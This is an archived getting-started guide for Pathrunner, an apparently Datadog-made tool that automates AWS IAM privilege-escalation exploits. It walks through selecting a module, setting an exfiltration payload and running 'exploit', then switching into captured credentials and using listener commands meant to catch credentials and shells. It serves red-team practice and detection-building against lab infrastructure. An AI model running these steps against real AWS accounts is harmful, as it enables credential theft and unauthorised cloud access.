---
type: Code
title: "Pathrunner: Getting Started"
description: Introduces Pathrunner identity import, exploit and payload selection, PMapper attack-path mapping and CloudFox resource imports. The guide separates initial credentials, target identities and the permissions needed for each module.
resource: "https://github.com/DataDog/pathfinding.cloud/blob/ecc3d092e7e409497474c8d39eb92f61810d815f/docs/pathrunner/getting-started.md"
tags: [code, webseclist-reference, en, datadog-pathfinding-cloud, aws, iam, privilege-escalation, tooling, owasp-a01-2021]
generated:
  by: webseclist-refs/1
  at: "2026-10-22T10:59:02+00:00"
verified:
  - by: AI archive validation
    at: 2026-10-22
status: stable
stale_after: 2027-10-22
sources:
  - id: original
    resource: "https://github.com/DataDog/pathfinding.cloud/blob/ecc3d092e7e409497474c8d39eb92f61810d815f/docs/pathrunner/getting-started.md"
    title: "Pathrunner: Getting Started"
also_at:
  - "https://pathfinding.cloud/pathrunner/getting-started"
authors: []
canonical_url: ""
cited_by:
  - "2026-ai.md:387"
commit: ""
content_sha256: b595dd5979ba83660c2a49b600e84a383bdc5ca90e41a96f019ff3a675a15608
depth: full
depth_reason: default
kind: code
language: en
licence: unknown
original_url: "https://github.com/DataDog/pathfinding.cloud/blob/ecc3d092e7e409497474c8d39eb92f61810d815f/docs/pathrunner/getting-started.md"
published: ""
publisher: Datadog Pathfinding.cloud
publisher_english: ""
raw_sha256: ee438b9f6d810ccf641c0eb1d7ffe6f447be5fb3d1399aabd99f77a174a110c5
retrieved_from: "https://github.com/DataDog/pathfinding.cloud/blob/ecc3d092e7e409497474c8d39eb92f61810d815f/docs/pathrunner/getting-started.md"
retrieved_kind: manual-import
retrieved_utc: "2026-10-22T10:59:02+00:00"
slug: datadog-pathfinding-cloud-pathrunner-getting-started
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Pathrunner: Getting Started

**Pathrunner: Getting Started** - Author not stated, Datadog Pathfinding.cloud.

- Published: date not stated
- Original: <https://github.com/DataDog/pathfinding.cloud/blob/ecc3d092e7e409497474c8d39eb92f61810d815f/docs/pathrunner/getting-started.md>
- Also published at: <https://pathfinding.cloud/pathrunner/getting-started>
- Preserved from: https://github.com/DataDog/pathfinding.cloud/blob/ecc3d092e7e409497474c8d39eb92f61810d815f/docs/pathrunner/getting-started.md (manual-import) on 2026-10-22
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Getting Started

Pathrunner automates the exploitation of AWS IAM privilege escalation paths. It is the execution layer of a three-project ecosystem: [pathfinding.cloud](https://pathfinding.cloud/paths/) documents each path, [pathfinding-labs](https://pathfinding.cloud/labs/) deploys vulnerable AWS infrastructure to practice against, and Pathrunner chains modules and payloads to escalate from an initial identity to elevated access.

## Installation

Requires Go 1.26+ and valid AWS credentials.

### go install

```
go install github.com/DataDog/pathrunner/cmd/pathrunner@latest
```

### Homebrew

```
brew tap DataDog/pathrunner https://github.com/DataDog/pathrunner
brew install DataDog/pathrunner/pathrunner
```

### Build from source

```
git clone https://github.com/DataDog/pathrunner.git
cd pathrunner
make build
cp pathrunner /usr/local/bin/
```

Prebuilt binaries are also attached to each [GitHub release](https://github.com/DataDog/pathrunner/releases).

## Quick Start

Pathrunner offers a Metasploit-style interactive REPL and a 1:1 scriptable CLI. The REPL walkthrough:

```
# Start the interactive shell
./pathrunner

# Add your AWS identity
pathrunner> identity add --profile my-aws-profile

# Browse available modules
pathrunner> search lambda
pathrunner> info lambda-001

# Select and configure a module
pathrunner> use lambda-001
pathrunner> show options
pathrunner> set ROLE_ARN arn:aws:iam::123456789012:role/TargetRole

# Choose a payload and execute
pathrunner> show payloads
pathrunner> set PAYLOAD exfil/response
pathrunner> exploit
```

After a successful exploit that captures credentials, they are auto-extracted and available as a new identity:

```
pathrunner> identity list          # New identity appears automatically
pathrunner> identity switch lambda_AB12
pathrunner> pmapper analyze        # See what is reachable from here
```

## Core Concepts

- **Identities are the sessions of the cloud.** Attacks hop from one identity to another by capturing credentials. Import an identity from almost any text format (`identity add --from-clipboard`) and switch between them instantly (`identity switch`).
- **Modular exploits.** A single interface over the full catalog of AWS privilege escalation [modules](https://pathfinding.cloud/pathrunner/modules), influenced by Metasploit, NetExec, and Pacu.
- **Modular payloads build better detections.** Each module supports multiple interchangeable [payloads](https://pathfinding.cloud/pathrunner/payloads), so you can pick one that works around network/SCP restrictions — and walk every payload to build a detection for each variant.
- **Attacker infrastructure, built in.** Configure an attacker identity and stand up a remote listener in your own account (`attacker infra ec2 create`, `attacker listener start`) to catch credentials and shells.
- **Hand the blue team an audit log.** `workspace report --output pathrunner.html` produces a handoff report of the resources created or modified and the CloudTrail events your activity generated, with timestamps.
- **Workspace isolation.** Each workspace maintains isolated identities, history, and tracked resources.

## Integrations

- **[PMapper](https://github.com/nccgroup/PMapper)** — `pmapper import` a graph, then `pmapper analyze` to see which escalation paths you can currently exploit, with suggested commands for each hop.
- **[CloudFox](https://github.com/BishopFox/cloudfox)** — `cloudfox import` its output to browse discovered AWS resources (`resources list`) and auto-populate them as module option values.

## Next steps

Browse the [exploit modules](https://pathfinding.cloud/pathrunner/modules) and [payloads](https://pathfinding.cloud/pathrunner/payloads), or read the full source at [github.com/DataDog/pathrunner](https://github.com/DataDog/pathrunner).
